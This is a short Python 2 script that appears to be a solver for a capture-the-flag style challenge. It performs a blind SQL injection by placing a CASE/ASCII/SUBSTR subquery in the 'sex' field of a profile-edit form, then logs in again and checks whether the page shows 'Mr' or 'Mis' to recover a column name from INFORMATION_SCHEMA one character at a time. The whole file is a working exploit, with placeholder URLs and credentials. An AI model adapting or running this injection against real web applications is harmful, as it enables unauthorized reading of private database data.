import requests as req
import sys

url = ""
id_ = 'tmpid'
pw_ = 'tmppw'
age_ = '8'
email_ = '123'

def doCheckInjectionResult():	# 
    LOGIN_URL = ""
    data_q = {'id':id_, 'pw':pw_}
    res = req.post(LOGIN_URL, data=data_q)
#    print res.text
 #   raw_input('continue?')
    if 'Mr' in res.text:
        #print res.text
        #raw_input('continue?')
        return True
    elif 'Mis' in res.text:
    #    print res.text
    #    raw_input('continue?')
        return False
    else:
        print res.text
        raw_input('continue?')

def doBlindSqli(idx):
    EDIT_URL = ""
    before = ''
    for i in range(32, 127, 1): # printable ascii
        sex_ = "(select case ascii(substr((select column_name from INFORMATION_SCHEMA.COLUMNS where table_name=0x4b4559424f58 limit 1), {}, 1)) when {} then 1 else 2 end)".format(idx, i)
		
        #print '== request =='
        data_ = {"id":id_, "pw":pw_, "pwch":pw_, "age":age_, "sex":sex_, "email":email_}
        
        #print data_


        res = req.post(EDIT_URL, data=data_)
   
        #print res.text
        #raw_input('continue?')
        

        if doCheckInjectionResult() == True:
            print chr(i), 
            before = chr(i)	
            break

    if before == '':
        print '[error] column name not found..'
        sys.exit(1)

		
       

def start():
    for i in range (1, 20, 1):  # column length
        doBlindSqli(i)


def main():
    start()

if __name__ == '__main__':
    main()
